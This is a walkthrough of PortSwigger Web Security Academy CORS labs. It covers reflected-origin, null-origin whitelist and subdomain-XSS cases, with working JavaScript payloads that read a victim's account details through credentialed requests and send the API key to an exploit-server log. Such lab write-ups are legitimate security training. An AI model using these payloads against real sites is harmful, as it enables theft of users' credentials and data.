1. This lab has a server that simply reflects the request's `Origin` header in its own `Access-Control-Allow-Origin` header and allows for using credentials cross-origin. This completely bypasses the same origin policy, and as such leaves script-based data exfiltration as a possibility. The API key can be stolen by using the following page on the provided exploit server:
```
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://ac811f871f9b20fcc012465d00eb009c.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
   location='https://exploit-ac561f7b1fa52098c08c46d70193008d.web-security-academy.net/log?key='+this.responseText;
};
</script>
```
2. This lab is similar to the previous, but instead of echoing any origin it only reflects those that are in a trusted whitelist. However, the `null` Origin is on the whitelist, so the following exploit works similarly to above by forcing a `null` origin:
```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://ac991f0e1eced1dfc02d206500180022.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='https://exploit-ac991f801e51d1e0c01a202701de00e0.web-security-academy.net/log?key='+this.responseText;
};
</script>"></iframe>
```
3. This lab is similar to the previous but it correctly ensures that CORS requests are coming from a subdomain. However, it does not ensure HTTPS, so it is vulnerable to a MITM based XSS attack. As that is not possible, a normal XSS is also possible because the `productId` parameter of the stock checking feature is vulnerable to XSS. As such, the following page on the exploit server can trigger the XSS and exfiltrate the victim's API key:
```
<script>
document.location = 'http://stock.ac7a1f801fa32062c03048e50004009b.web-security-academy.net/?productId=1<script>var req=new XMLHttpRequest();req.onload=reqListener;req.open("get", "https://ac7a1f801fa32062c03048e50004009b.web-security-academy.net/accountDetails", true);req.withCredentials=true;req.send();function reqListener(){location="https://exploit-ac6e1fc11f28207ec0eb482c018f0056.web-security-academy.net/log?data="%2bthis.responseText;};%3c/script>&storeId=1';
</script>
```
4. This lab is not possible to solve without Burp Pro
